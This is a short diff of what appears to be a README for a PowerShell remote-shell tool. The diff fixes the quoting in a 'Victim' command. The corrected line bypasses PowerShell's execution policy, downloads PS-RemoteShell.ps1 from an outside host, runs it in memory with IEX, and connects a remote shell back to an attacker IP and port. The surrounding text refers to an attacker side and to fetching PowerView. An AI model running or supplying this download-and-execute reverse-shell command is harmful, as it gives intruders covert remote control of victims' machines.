@@ -33,7 +33,7 @@ For example if you fetch PowerView.ps1 script it will be fully encrypted over th
 
 Victim:
 ```
-powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString("http://ringzer0team.com/PS-RemoteShell.ps1); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000
+powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1'); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000
 ```
 
 Attacker side example:
